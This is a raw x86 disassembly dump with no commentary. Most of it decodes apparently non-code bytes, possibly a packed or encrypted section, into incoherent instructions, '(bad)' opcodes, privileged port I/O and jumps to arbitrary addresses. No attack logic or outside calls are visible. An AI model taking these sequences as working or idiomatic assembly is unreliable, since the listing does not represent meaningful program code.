  41fd62:	sbb    al,dl
  41fd64:	(bad)  
  41fd65:	mov    eax,?
  41fd67:	add    eax,edi
  41fd69:	mov    dl,0x56
  41fd6b:	or     DWORD PTR [ebx],0xffffffdf
  41fd6e:	rcl    DWORD PTR [eax],0x6
  41fd71:	lea    ebx,[eax]
  41fd73:	ret    
  41fd74:	xchg   ecx,eax
  41fd75:	adc    eax,0xed49fca4
  41fd7a:	mov    edi,0x1c5e153c
  41fd7f:	xlat   BYTE PTR ds:[ebx]
  41fd80:	cmc    
  41fd81:	pinsrw mm4,WORD PTR [ecx+0x2eb7cafc],0xda
  41fd89:	int    0xc6
  41fd8b:	inc    eax
  41fd8c:	xor    al,0x10
  41fd8e:	retf   
  41fd8f:	rcl    DWORD PTR [esi+edx*2-0x34a368af],cl
  41fd96:	push   esp
  41fd97:	das    
  41fd98:	loop   0x41fd90
  41fd9a:	mov    ebx,0x456ba5d9
  41fd9f:	in     eax,dx
  41fda0:	mov    edi,DWORD PTR [eax-0x1f]
  41fda3:	mov    ebp,0x2c6cfdc9
  41fda8:	shl    dl,1
  41fdaa:	jne    0x41fd71
  41fdac:	jp     0x41fe23
  41fdae:	lahf   
  41fdaf:	inc    DWORD PTR [ebp+0x79]
  41fdb2:	jb     0x41fd4d
  41fdb4:	(bad)  
  41fdb6:	(bad)  
  41fdb7:	gs out dx,al
  41fdb9:	imul   ecx,edx,0x7
  41fdbc:	out    dx,al
  41fdbd:	outs   dx,DWORD PTR ds:[esi]
  41fdbe:	int3   
  41fdbf:	mov    ds:0x56abb480,eax
  41fdc4:	or     eax,0x1c17d3cb
  41fdc9:	dec    eax
  41fdca:	jge    0x41fdfa
  41fdcc:	iret   
  41fdcd:	out    dx,eax
  41fdce:	inc    edx
  41fdcf:	mov    al,0xbf
  41fdd1:	(bad)  
  41fdd2:	cmc    
  41fdd3:	adc    edx,DWORD PTR [ebx]
  41fdd5:	or     DWORD PTR [ebx+0x57],ebx
  41fdd8:	cmp    BYTE PTR [ebp-0x34],0x71
  41fddc:	jne    0x41fde8
  41fdde:	adc    al,0x3f
  41fde0:	or     BYTE PTR [eax-0x7a2f167e],ch
  41fde6:	add    eax,eax
  41fde8:	dec    esi
  41fde9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdea:	mov    al,ds:0xcd8c118b
  41fdef:	add    cl,cl
  41fdf1:	xchg   ebx,eax
  41fdf2:	(bad)  
  41fdf3:	fdivp  st(0),st
  41fdf5:	pusha  
  41fdf6:	lods   eax,DWORD PTR ds:[esi]
  41fdf7:	icebp  
  41fdf8:	cld    
  41fdf9:	ror    DWORD PTR [eax+0x15b3b43],1
  41fdff:	jae    0x41fe75
  41fe01:	jmp    0x24b2e7c8
  41fe06:	push   esi
  41fe07:	push   edi
  41fe08:	push   es
  41fe09:	mov    bl,0xb6
  41fe0b:	xchg   esp,eax
  41fe0c:	loop   0x41fdbd
  41fe0e:	mov    ds:0x3df90bf7,al
  41fe13:	imul   edx,DWORD PTR [edx+0x52],0xe72daa60
  41fe1a:	push   esp
  41fe1b:	xor    esp,DWORD PTR [esp+edi*1-0x29]
  41fe1f:	add    ch,0x3b
  41fe22:	ds dec edx
  41fe24:	push   0x70
  41fe26:	and    BYTE PTR [esp-0x48],ah
  41fe2a:	pop    ecx
  41fe2b:	je     0x41fdde
  41fe2d:	dec    eax
  41fe2e:	loopne 0x41fe09
  41fe30:	stc    
  41fe31:	cs aad 0x27
  41fe34:	(bad)  
  41fe35:	mul    ebp
  41fe37:	jmp    0xf5650518
  41fe3c:	jns    0x41fdf0
  41fe3e:	lods   eax,DWORD PTR ds:[esi]
  41fe3f:	jo     0x41fdfa
  41fe41:	icebp  
  41fe42:	sar    esp,0x51
  41fe45:	shr    BYTE PTR [eax+0x29a505a0],1
  41fe4b:	sub    ecx,ebx
  41fe4d:	icebp  
  41fe4e:	popa   
  41fe4f:	inc    eax
  41fe50:	pop    ecx
  41fe51:	mov    edx,0x119483e1
  41fe56:	xor    al,0x8
  41fe58:	cmp    ecx,DWORD PTR [eax+0x25]
  41fe5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe5c:	lds    esi,FWORD PTR [edx-0x661436ba]
  41fe62:	mov    dl,0xd7
  41fe64:	push   ebp
  41fe65:	pop    ecx
  41fe66:	push   ebp
  41fe67:	sti    
  41fe68:	cmp    ah,bh
  41fe6a:	push   esi
  41fe6b:	mov    BYTE PTR [ebx+0x76b4d169],0x82
  41fe72:	push   ecx
  41fe73:	cli    
  41fe74:	retf   
  41fe75:	popf   
  41fe76:	add    esi,DWORD PTR [edi+0x13]
  41fe79:	adc    eax,0x3b4c6933
  41fe7e:	mov    esi,0xc61d7ace
  41fe83:	push   ds
  41fe84:	xor    bl,BYTE PTR [eax-0x447aaaa4]
  41fe8a:	xchg   ebp,esi
  41fe8c:	aaa    
  41fe8d:	adc    eax,0x8c62ea20
  41fe92:	iret   
  41fe93:	ins    DWORD PTR es:[edi],dx
  41fe94:	test   al,0x65
  41fe96:	jns    0x41fe59
  41fe98:	fwait
  41fe99:	adc    al,0xbe
  41fe9b:	adc    DWORD PTR [ebx+0x539f3729],ecx
  41fea1:	aas    
  41fea2:	inc    edi
  41fea3:	xor    DWORD PTR [eax+0x47],0x34
  41fea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fea8:	jp     0x41feb8
  41feaa:	dec    esp
  41feab:	or     dl,bl
  41fead:	mov    ebp,0xf939c56e
  41feb2:	mov    dl,0x38
  41feb4:	inc    edi
  41feb5:	cmp    al,0x7b
  41feb7:	adc    cl,BYTE PTR [edi+0x56f0d4b8]
  41febd:	pop    es
  41febe:	lahf   
  41febf:	int    0xb
  41fec1:	xchg   ebx,eax
  41fec2:	jge    0x41ff2d
  41fec4:	inc    eax
  41fec5:	xlat   BYTE PTR ds:[ebx]
  41fec6:	push   eax
  41fec7:	jb     0x41feff
  41fec9:	jns    0x41fe61
  41fecb:	call   0x9846:0x88a4dd61
  41fed2:	popf   
  41fed3:	cmc    
  41fed4:	sbb    esp,DWORD PTR ds:0xf27d1957
  41feda:	pop    ecx
  41fedb:	cmp    eax,DWORD PTR [ecx]
  41fedd:	and    DWORD PTR [edi+0x6b],ecx
  41fee0:	and    eax,DWORD PTR [ebp-0x44]
  41fee3:	fisubr DWORD PTR [edx]
  41fee5:	(bad)  
  41fee7:	or     al,bh
  41fee9:	loope  0x41ff18
  41feeb:	mov    edx,DWORD PTR [esi]
  41feed:	hlt    
  41feee:	in     al,dx
  41feef:	rcr    BYTE PTR [ecx],1
  41fef1:	std    
  41fef2:	jge    0x41fe90
  41fef4:	add    al,0x69
  41fef6:	pushf  
  41fef7:	fdiv   DWORD PTR [esp+ecx*4-0x705ebfc7]
  41fefe:	xor    edi,ebx
  41ff00:	jge    0x41fefa
  41ff02:	retf   0x72e
  41ff05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff06:	cwde   
  41ff07:	bswap  esi
  41ff09:	pop    ebx
  41ff0a:	leave  
  41ff0b:	push   cs
  41ff0c:	jmp    FWORD PTR [eax+eiz*1+0x474507bc]
  41ff13:	daa    
  41ff14:	adc    eax,0xa68ae269
  41ff19:	adc    DWORD PTR [esi],ebx
  41ff1b:	pop    ds
  41ff1c:	cmp    ch,BYTE PTR [ecx+0x5d1f142]
  41ff22:	pop    edx
  41ff23:	inc    ecx
  41ff24:	mov    ds:0xd83070b5,al
  41ff29:	fild   DWORD PTR [esi]
  41ff2b:	test   al,0x90
  41ff2d:	in     eax,dx
  41ff2e:	jmp    0x5069:0x9ab395de
  41ff35:	sar    bh,0xec
  41ff38:	xor    edx,edx
  41ff3a:	push   0x3
  41ff3c:	pop    ecx
  41ff3d:	div    ecx
  41ff3f:	mov    ecx,DWORD PTR [ebp-0x40]
  41ff42:	or     eax,ecx
  41ff44:	mov    ecx,DWORD PTR [ebp-0x54]
  41ff47:	xor    edx,edx
  41ff49:	div    ecx
  41ff4b:	imul   eax,eax,0x7d53
  41ff51:	jmp    0x420338
  41ff56:	xor    DWORD PTR [ebx],edx
  41ff58:	(bad)  
  41ff59:	in     al,dx
  41ff5a:	scas   eax,DWORD PTR es:[edi]
  41ff5b:	imul   edi,DWORD PTR [ebx-0x57113e5],0xffffffa4
  41ff62:	cdq    
  41ff63:	loopne 0x41ff6b
  41ff65:	xchg   edx,eax
  41ff66:	arpl   WORD PTR [ebp-0x3bb54140],dx
  41ff6c:	mov    esi,0xe972e8be
  41ff71:	fcom   QWORD PTR [ebx]
  41ff73:	sbb    BYTE PTR [edx+eiz*4+0x2a],dh
  41ff77:	les    esi,FWORD PTR [ebx]
  41ff79:	fstp   TBYTE PTR ds:0xf717d4ae
  41ff7f:	xor    ebx,ecx
  41ff81:	popa   
  41ff82:	adc    DWORD PTR [ebp-0x456644b8],esi
  41ff88:	xor    eax,0x5b640748
  41ff8d:	cmp    eax,0xa2e0aee0
  41ff92:	fnsave ds:0xbf64640e
  41ff99:	and    esp,DWORD PTR [eax+0x71]
  41ff9c:	cmp    eax,0xfc6e2f73
  41ffa1:	mov    fs,WORD PTR [ebx-0x7c]
  41ffa4:	mov    eax,ds:0x3a63506d
  41ffa9:	outs   dx,DWORD PTR ds:[esi]
  41ffaa:	mov    ebp,0x46da8c8c
  41ffaf:	mov    eax,DWORD PTR [esi]
  41ffb1:	invd   
  41ffb3:	es scas eax,DWORD PTR es:[edi]
  41ffb5:	dec    ebx
  41ffb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffb7:	jl     0x41ffa7
  41ffb9:	inc    edx
  41ffba:	push   ebx
  41ffbb:	dec    ebx
  41ffbc:	scas   al,BYTE PTR es:[edi]
  41ffbd:	cs aaa 
  41ffbf:	and    BYTE PTR [esi+ecx*1],0xb5
  41ffc3:	pop    ds
  41ffc4:	gs call 0xe9cf1cfa
  41ffca:	(bad)  
  41ffcb:	bound  esp,QWORD PTR [ecx+0x7b45bdba]
  41ffd1:	adc    ch,BYTE PTR [ebx-0x4503b72f]
  41ffd7:	pushf  
  41ffd8:	mov    ecx,ds
  41ffda:	out    dx,eax
  41ffdb:	out    0xf1,al
  41ffdd:	push   edx
  41ffde:	sahf   
  41ffdf:	dec    ecx
  41ffe0:	in     eax,0x67
  41ffe2:	fwait
  41ffe3:	es pop es
  41ffe5:	mov    bh,0xaf
  41ffe7:	xchg   DWORD PTR ds:0x588705a8,edi
  41ffed:	cld    
  41ffee:	and    edi,DWORD PTR [ebx]
  41fff0:	fdivr  QWORD PTR [ebp+0x10f183f6]
  41fff6:	fiadd  DWORD PTR [edx]
  41fff8:	aas    
  41fff9:	or     al,0xb9
  41fffb:	mov    ah,0xda
  41fffd:	inc    edi
  41fffe:	push   edx
  41ffff:	jo     0x41fffb
  420001:	mov    ebp,0xdbb05de2
  420006:	cmp    DWORD PTR [ecx],esp
  420008:	test   eax,0xe0e0bbb9
  42000d:	push   ecx
  42000e:	or     ah,ch
  420010:	imul   esi,DWORD PTR [ebx-0x5e62a9ae],0xf1f0fad8
  42001a:	xlat   BYTE PTR ds:[ebx]
  42001b:	(bad)  
  42001c:	sbb    eax,0xcd355e7
  420021:	mov    bl,0xb8
  420023:	in     al,dx
  420024:	push   edi
  420025:	mov    ebp,0x9224c00a
  42002a:	xor    ebx,DWORD PTR [esi+eiz*8+0x54]
  42002e:	mov    ebp,0xa8bb73b1
  420033:	xor    ebx,0xffffffc8
  420036:	pop    ss
  420037:	jmp    0xf4ef:0xf33fc444
  42003e:	in     al,dx
  42003f:	sub    DWORD PTR ds:0x51e1923c,edi
  420045:	add    al,0x79
  420047:	fnstsw ax
  420049:	ror    DWORD PTR [eax],cl
  42004b:	clc    
  42004c:	pop    eax
  42004d:	or     ecx,esi
  42004f:	stos   DWORD PTR es:[edi],eax
  420050:	pop    eax
  420051:	fisttp WORD PTR [ebx-0x706d86f0]
  420057:	mov    al,ds:0xacbc838e
  42005c:	lea    edi,[ecx]
  42005e:	sahf   
  42005f:	setb   BYTE PTR [ebp-0x27e5dea1]
  420066:	push   esi
  420067:	inc    edi
  420068:	pop    ebx
  420069:	pop    ss
  42006a:	jg     0x4200c8
  42006c:	fist   DWORD PTR [ebx-0x507d2ce]
  420072:	dec    esp
  420073:	inc    edx
  420074:	mov    ah,0x71
  420076:	xor    eax,0x1f9f0d2a
  42007b:	daa    
  42007c:	pop    edi
  42007d:	xor    BYTE PTR [esp+esi*1+0x2d],dh
  420081:	out    dx,al
  420082:	jmp    0xe783:0x34f0e3f7
  420089:	outs   dx,BYTE PTR ds:[esi]
  42008a:	cmc    
  42008b:	ret    
  42008c:	inc    edi
  42008d:	fld    DWORD PTR [esi+0x3e]
  420090:	jne    0x42001f
  420092:	inc    ecx
  420093:	cmc    
  420094:	mov    cl,0xb5
  420096:	sub    ch,dh
  420098:	leave  
  420099:	pop    esp
  42009a:	test   BYTE PTR [ebp-0x5ea66b6],ah
  4200a0:	test   eax,0x25ce7b46
  4200a5:	jnp    0x42008e
  4200a7:	aas    
  4200a8:	add    eax,0x3c6d73fc
  4200ad:	or     ch,bl
  4200af:	jbe    0x420066
  4200b1:	fmul   DWORD PTR [esi]
  4200b3:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4200b5:	and    ch,0xe9
  4200b8:	ret    0xf788
  4200bb:	dec    esi
  4200bc:	xor    DWORD PTR [ecx-0x510bb6a9],0x236e1ef3
  4200c6:	push   eax
  4200c7:	loop   0x420067
  4200c9:	jmp    0x420096
  4200cb:	sub    ecx,DWORD PTR [edx+edi*2]
  4200ce:	pop    esp
  4200cf:	mov    ah,BYTE PTR [esp+eax*2]
  4200d2:	inc    esp
  4200d3:	ret    
  4200d4:	sub    BYTE PTR [eax+0x3e],0xd7
  4200d8:	add    DWORD PTR [esi],eax
  4200da:	mov    BYTE PTR [edi],bl
  4200dc:	jnp    0x420147
  4200de:	cmp    ebp,ebp
  4200e0:	fisub  WORD PTR [ebx+0x8]
  4200e3:	popw   ds
  4200e5:	lea    ecx,[eax+0x39b6b37e]
  4200eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200ec:	out    dx,eax
  4200ed:	sub    dh,BYTE PTR [edx-0x828253f]
  4200f3:	iret   
  4200f4:	inc    edi
  4200f5:	jl     0x420087
  4200f7:	and    al,0x6b
  4200f9:	ret    
  4200fa:	sub    esp,DWORD PTR [esi+eax*4-0x49]
  4200fe:	cmp    eax,0xc665aead
  420103:	ins    BYTE PTR es:[edi],dx
  420104:	sti    
  420105:	ret    0xa8a1
  420108:	outs   dx,BYTE PTR ds:[esi]
  420109:	cmp    esi,DWORD PTR [ebx+0x3a]
  42010c:	dec    edx
  42010d:	xor    al,0xb4
  42010f:	xchg   edx,eax
  420110:	call   0x14b50ca0
  420115:	adc    al,0x33
  420117:	push   esp
  420118:	sbb    BYTE PTR [eax+0x4],ah
  42011b:	xor    BYTE PTR [esi+0x1f28e122],bh
  420121:	js     0x4200a8
  420123:	mov    DWORD PTR [eax+0x4f],eax
  420126:	addr16 push es
  420128:	pushf  
  420129:	icebp  
  42012a:	xchg   ecx,eax
  42012b:	push   eax
  42012c:	enter  0x37f4,0xcd
  420130:	adc    al,0x29
  420132:	popf   
  420133:	imul   edi,DWORD PTR [edx+0x15bee743],0x94c7d1c9
  42013d:	rsm    
  42013f:	gs dec esp
  420141:	out    0x55,eax
  420143:	xor    DWORD PTR [edi],eax
  420145:	pop    ebp
  420146:	inc    eax
  420147:	cmp    BYTE PTR [eax+0x3eae8509],0x89
  42014e:	jnp    0x42016b
  420150:	hlt    
  420151:	hlt    
  420152:	push   es
  420153:	dec    ebx
  420154:	(bad)  
  420156:	pop    esi
  420157:	mov    WORD PTR [ecx-0x1a],?
  42015a:	mov    cs,WORD PTR [edx+0x303f07b9]
  420160:	mov    dl,0x13
  420162:	mov    ebp,0xad1d4eec
  420167:	pop    ebp
  420168:	push   edx
  420169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42016a:	jmp    0x420123
  42016c:	dec    esp
  42016d:	sub    ecx,edi
  42016f:	pop    ecx
  420170:	fwait
  420171:	mov    dl,0x42
  420173:	retf   0x6cb8
  420176:	(bad)  
  420177:	outs   dx,BYTE PTR ds:[esi]
  420178:	jbe    0x4201dd
  42017a:	fwait
  42017b:	xor    BYTE PTR [ecx+0x268d659b],dl
  420181:	mov    eax,ds:0xad9d6ad2
  420186:	jo     0x42011e
  420188:	inc    ecx
  420189:	ins    BYTE PTR es:[edi],dx
  42018a:	cmc    
  42018b:	or     DWORD PTR [ebp+eax*8-0x5ab3045],edi
  420192:	stos   DWORD PTR es:[edi],eax
  420193:	mov    edi,0xcf53e191
  420198:	stos   BYTE PTR es:[edi],al
  420199:	loopne 0x4201af
  42019b:	inc    esi
  42019c:	out    dx,eax
  42019d:	push   ecx
  42019e:	push   esp
  42019f:	sub    ah,dh
  4201a1:	pusha  
  4201a2:	push   ebx
  4201a3:	imul   eax,DWORD PTR [edi],0x2570cc2d
  4201a9:	mov    dl,0xe9
  4201ab:	mov    eax,ds:0x452a1af2
  4201b0:	outs   dx,BYTE PTR ds:[esi]
  4201b1:	and    eax,esi
  4201b3:	fiadd  WORD PTR [edi-0x1b]
  4201b6:	xchg   bh,bl
  4201b8:	add    al,0x77
  4201ba:	mov    esp,0x75bafb5b
  4201bf:	mov    DWORD PTR [ebx+0x43951ed4],ebx
  4201c5:	loope  0x42019f
  4201c7:	call   0x6767dc52
  4201cc:	mov    cl,0x6c
  4201ce:	lods   eax,DWORD PTR ds:[esi]
  4201cf:	mov    bh,0x9e
  4201d1:	test   eax,0x40c04763
  4201d6:	std    
  4201d7:	jmp    0x42021a
  4201d9:	inc    ebp
  4201da:	outs   dx,DWORD PTR ds:[esi]
  4201db:	sbb    bl,BYTE PTR [ebx+0x8]
  4201de:	and    al,0x16
  4201e0:	(bad)  
  4201e1:	add    DWORD PTR [ebp-0x331f1e0f],eax
  4201e7:	adc    BYTE PTR cs:[ecx+0x14],0x9c
  4201ec:	int    0x24
  4201ee:	mov    al,0xcc
  4201f0:	lods   eax,DWORD PTR ds:[esi]
  4201f1:	out    dx,al
  4201f2:	outs   dx,DWORD PTR ds:[esi]
  4201f3:	push   ebx
  4201f4:	not    DWORD PTR [esi+0x7c]
  4201f7:	data16 jbe 0x420199
  4201fa:	in     eax,0x9e
  4201fc:	sbb    dl,bl
  4201fe:	int    0x3d
  420200:	cmp    DWORD PTR [esi-0x4c6a66bf],ebx
  420206:	mov    ebp,DWORD PTR [ebp-0x72c71378]
  42020c:	adc    al,0x7
  42020e:	sbb    edi,eax
  420210:	mov    edx,0xd40e3a90
  420215:	pop    ebx
  420216:	in     al,dx
  420217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420218:	sub    BYTE PTR [edi-0x13],bl
  42021b:	pop    edi
  42021c:	cmp    BYTE PTR [ecx-0x21],bh
  42021f:	je     0x4201c8
  420221:	(bad)  
  420222:	loope  0x420234
  420224:	pop    ebp
  420225:	test   BYTE PTR [eax+0x14845cee],bl
  42022b:	cli    
  42022c:	jl     0x4202a4
  42022e:	leave  
  42022f:	pop    esi
  420230:	pandn  mm5,QWORD PTR [eax]
  420233:	sahf   
  420234:	or     DWORD PTR [ebp+0x6f14aea8],ebx
  42023a:	push   ds
  42023b:	mov    edi,0xffe2eec3
  420240:	dec    esi
  420241:	dec    ecx
  420242:	jnp    0x42021b
  420244:	loopne 0x42028b
  420246:	dec    edi
  420247:	push   ebx
  420248:	mov    dl,0x59
  42024a:	adc    eax,0x8fd5109b
  42024f:	jnp    0x4201fe
  420251:	xor    ecx,DWORD PTR [edx+edi*8+0x36]
  420255:	mov    gs,WORD PTR [eax+edi*8+0x26a9bfc6]
  42025c:	test   al,0xc9
  42025e:	adc    dh,BYTE PTR [ebp+0x69]
  420261:	adc    bh,BYTE PTR [edi]
  420263:	shl    edx,1
  420265:	mov    cl,0x55
  420267:	lea    ecx,[ebp-0x13]
  42026a:	mov    ecx,0x66edbecd
  42026f:	xchg   ebx,eax
  420270:	sbb    dh,BYTE PTR cs:[eax+0x1b]
  420274:	cmc    
  420275:	adc    BYTE PTR [ebx+0x6c7435a1],dl
  42027b:	dec    esi
  42027c:	add    al,0x3a
  42027e:	inc    esp
  42027f:	adc    bl,BYTE PTR [edx-0x21]
  420282:	ror    BYTE PTR [eax],cl
  420284:	test   al,0x8
  420286:	mov    ah,0xef
  420288:	or     DWORD PTR [edx+0x3a],edi
  42028b:	xchg   ebx,eax
  42028c:	push   ecx
  42028d:	mov    BYTE PTR [ebp-0x39],al
  420290:	xchg   edi,eax
  420292:	enter  0xc475,0x9a
  420296:	sti    
  420297:	and    ebp,DWORD PTR [esi+0x26dedb17]
  42029d:	push   ecx
  42029e:	xchg   esi,eax
  42029f:	dec    eax
  4202a0:	inc    ecx
  4202a1:	out    dx,al
  4202a2:	jmp    0x42027e
  4202a4:	adc    eax,0xae872a59
  4202a9:	mov    eax,ds:0x4b271f79
  4202ae:	push   ebx
  4202af:	imul   esi,DWORD PTR [edi+0x3a],0xfc02d73e
  4202b6:	hlt    
  4202b7:	ret    0x49be
  4202ba:	retf   
  4202bb:	es rcr eax,1
  4202be:	sbb    eax,0x8b2ef40a
  4202c3:	pop    esi
  4202c4:	adc    dh,BYTE PTR [ecx+0x3b6f4e3f]
  4202ca:	add    al,cl
  4202cc:	daa    
  4202cd:	or     BYTE PTR [edi+ebx*2],cl
  4202d0:	repnz mov ebp,0x4a7f469b
  4202d6:	pavgw  mm4,QWORD PTR [ebx-0x5e8c67c0]
  4202dd:	and    ah,BYTE PTR [ebp+0x6d]
  4202e0:	mov    dh,0x2e
  4202e2:	xchg   ecx,eax
  4202e3:	pop    eax
  4202e4:	xchg   DWORD PTR [ecx+0x5f],ecx
  4202e7:	mov    bh,0x79
  4202e9:	pop    es
  4202ea:	add    esp,DWORD PTR [ebp+eax*8-0x34]
  4202ee:	(bad)  
  4202f0:	and    al,0xca
  4202f2:	jle    0x420366
  4202f4:	rcr    BYTE PTR [ecx+ebx*2+0x31d0ba7b],0x2e
  4202fc:	enter  0xe384,0xe0
  420300:	ret    
  420301:	movq   QWORD PTR [esi-0x1097f5d9],mm7
  420308:	xlat   BYTE PTR ds:[ebx]
  420309:	and    eax,0x3bdb6b8e
  42030e:	fmul   QWORD PTR [esi-0x7413f65b]
  420314:	jbe    0x4202e3
  420316:	push   edx
  420317:	add    DWORD PTR [edi],ebx
  420319:	sbb    BYTE PTR [edx],cl
  42031b:	(bad)  
  42031c:	popa   
  42031d:	dec    eax
  42031e:	out    0x6e,eax
  420320:	xchg   DWORD PTR ds:0xa316cca8,edx
  420326:	jbe    0x42032c
  420328:	push   ecx
  420329:	fisubr WORD PTR [ebx+eax*1+0x50]
  42032d:	push   ebp
  42032e:	mov    fs,WORD PTR [edi-0x7b720859]
  420334:	loop   0x420313
  420336:	pop    esp
  420337:	adc    cl,BYTE PTR [ebx-0x7b72f7b3]
  42033d:	add    ecx,edi
  42033f:	mov    bh,0xac
  420341:	loopne 0x4202ce
  420343:	lea    edx,[eax]
  420345:	(bad)  
  420346:	(bad)  
  420347:	inc    DWORD PTR [ecx+0x4108e1]
  42034d:	add    BYTE PTR [ecx+0x40e7e1],al
  420353:	add    BYTE PTR [ecx+0x1a54e9],al
  420359:	add    BYTE PTR [ecx+0x25acf1],al
  42035f:	add    BYTE PTR [ebx-0x1036b],cl
  420365:	(bad)  
  420366:	jmp    0x42074d
  42036b:	pop    eax
  42036c:	dec    ecx
  42036d:	xchg   esi,eax
  42036e:	jmp    0x42030c
  420370:	cmp    al,0xbc
  420372:	jns    0x4203a4
  420374:	inc    edx
  420375:	aad    0xe3
  420377:	mov    ch,0x58
  420379:	mov    ss,WORD PTR [eax-0x413f6211]
  42037f:	dec    edx
  420380:	les    edi,FWORD PTR [esi+0x81277be]
  420386:	ret    0xf7c9
  420389:	out    dx,al
  42038a:	sar    DWORD PTR [ebx+0x43674df0],cl
  420390:	fsubr  QWORD PTR [esi-0x54102229]
  420396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420397:	js     0x4203c0
  420399:	add    al,0x5a
  42039b:	test   eax,0xdad344d7
  4203a0:	icebp  
  4203a1:	mov    DWORD PTR [eax+eiz*8-0x1ef770ca],edi
  4203a8:	dec    ecx
  4203a9:	inc    edi
  4203aa:	push   ebx
  4203ab:	cdq    
  4203ac:	(bad)  
  4203ad:	jbe    0x4203b3
  4203af:	cmp    BYTE PTR [esp+eiz*4],bh
  4203b2:	pop    edi
  4203b3:	or     eax,0xe9c173a3
  4203b8:	sbb    DWORD PTR [eax],edx
  4203ba:	sbb    al,0x92
  4203bc:	aas    
  4203bd:	inc    ebx
  4203be:	xchg   ebx,eax
  4203bf:	jbe    0x42043c
  4203c1:	sbb    ch,BYTE PTR [edx+edx*1+0x4]
  4203c5:	jo     0x42043a
  4203c7:	jge    0x420384
  4203c9:	repz daa 
  4203cb:	xor    DWORD PTR ds:0x394847df,edx
  4203d1:	mov    esp,0x18d1b614
  4203d6:	and    bl,BYTE PTR [edx+0x58ec9471]
  4203dc:	std    
  4203dd:	popf   
  4203de:	mov    cs,WORD PTR [ebp+0xb]
  4203e1:	mov    eax,ds:0x7d21b5d1
  4203e6:	or     DWORD PTR [ecx],ebx
  4203e8:	sbb    BYTE PTR [ebp+0x7f],0x6e
  4203ec:	mov    esp,0x23d4dec0
  4203f1:	in     eax,0x53
  4203f3:	aam    0x45
  4203f5:	and    bh,dl
  4203f7:	adc    eax,0xe9f74646
  4203fc:	push   ss
  4203fd:	adc    BYTE PTR [ecx-0x25ec1cb],dl
  420403:	mov    ecx,0x1ad39e3d
  420408:	lods   eax,DWORD PTR ds:[esi]
  420409:	gs xchg edx,eax
  42040b:	call   DWORD PTR [ebp-0x4c]
  42040e:	lods   eax,DWORD PTR ds:[esi]
  42040f:	pushf  
  420410:	loopne 0x420431
  420412:	pop    edi
  420413:	mov    ebx,0xdaa0ceb2
  420418:	rol    DWORD PTR [esi-0x79138d5f],1
  42041e:	add    al,0xe8
  420420:	popf   
  420421:	xchg   DWORD PTR [eax],edx
  420423:	dec    edx
  420424:	(bad)  
  420426:	popf   
  420427:	leave  
  420428:	xlat   BYTE PTR ds:[ebx]
  420429:	sub    eax,0xfffffff2
  42042c:	mov    cl,0x24
  42042e:	rol    esp,0x86
  420431:	xchg   edi,eax
  420432:	mov    dh,0xac
  420434:	push   0xffffffd2
  420436:	or     dh,BYTE PTR [ebx-0x7b]
  420439:	leave  
  42043a:	into   
  42043b:	cli    
  42043c:	shl    BYTE PTR [eax-0x61144fc5],1
  420442:	inc    ebp
  420443:	xchg   edi,eax
  420444:	jmp    0x92cbbf1b
  420449:	shr    cl,1
  42044b:	mov    BYTE PTR [eax+eiz*1-0x7a],dh
  42044f:	sub    ecx,DWORD PTR ds:0x8384c86b
  420455:	mov    ah,0x9f
  420457:	out    dx,eax
  420458:	adc    BYTE PTR ds:0xdc7bf93,dh
  42045e:	lock ror BYTE PTR [ecx+0x7f],1
  420462:	jno    0x420457
  420464:	mov    esp,0xf3fd00f5
  420469:	(bad)  
  42046a:	xlat   BYTE PTR ds:[ebx]
  42046b:	stos   DWORD PTR es:[edi],eax
  42046c:	jle    0x4204e9
  42046e:	call   DWORD PTR [ebx+edx*4+0x38]
  420472:	pop    ebp
  420473:	dec    esi
  420474:	dec    ebp
  420475:	and    eax,0x1608934d
  42047a:	add    DWORD PTR [ecx],ebx
  42047c:	fsubrp st(7),st
  42047e:	push   0x4d699600
  420483:	mov    edx,0x5c82d765
  420488:	push   edx
  420489:	jns    0x4204f3
  42048b:	sub    al,0xdf
  42048d:	jg     0x420451
  42048f:	jecxz  0x42049d
  420491:	cmp    BYTE PTR [ebp+0x4f],bl
  420494:	or     BYTE PTR [ebx-0xf],al
  420497:	stc    
  420498:	pop    edx
  420499:	sub    edi,DWORD PTR [edi+0x53]
  42049c:	hlt    
  42049d:	loop   0x4204a5
  42049f:	int    0x53
  4204a1:	sub    BYTE PTR [esi+eiz*2+0x38],bl
  4204a5:	mov    BYTE PTR [eax],ah
  4204a7:	daa    
  4204a8:	lods   eax,DWORD PTR ds:[esi]
  4204a9:	mov    esi,DWORD PTR [edi-0x1c]
  4204ac:	shl    DWORD PTR [edx+0x755a47ca],1
  4204b2:	mov    al,0x2a
  4204b4:	or     DWORD PTR [edi],edx
  4204b6:	jle    0x4204e6
  4204b8:	(bad)  [eax-0x48]
  4204bb:	pusha  
  4204bc:	xchg   DWORD PTR [esi+ebx*4+0x5a6db8f1],ebx
  4204c3:	test   BYTE PTR [edi-0x549f7fcf],dh
  4204c9:	xchg   edi,eax
  4204ca:	or     ebx,DWORD PTR [eax+0x60]
  4204cd:	xchg   edi,eax
  4204ce:	fucomip st,st(7)
  4204d0:	dec    esi
  4204d1:	sbb    cl,BYTE PTR ds:0x49b5e815
  4204d7:	cdq    
  4204d8:	push   es
  4204d9:	outs   dx,BYTE PTR ds:[esi]
  4204da:	add    al,0xea
  4204dc:	and    eax,DWORD PTR [eax]
  4204de:	sub    ebx,DWORD PTR [eax+edx*1]
  4204e1:	ins    BYTE PTR es:[edi],dx
  4204e2:	inc    edx
  4204e3:	cmc    
  4204e4:	sbb    esi,DWORD PTR [ecx]
  4204e6:	jno    0x420472
  4204e8:	jns    0x4204dc
  4204ea:	cmc    
  4204eb:	arpl   WORD PTR [edi-0x16299637],si
  4204f1:	cs push edi
  4204f3:	in     eax,0xd7
  4204f5:	xor    esi,DWORD PTR [ebp+0x5c]
  4204f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204f9:	fisttp WORD PTR [ebx+0x1c61b266]
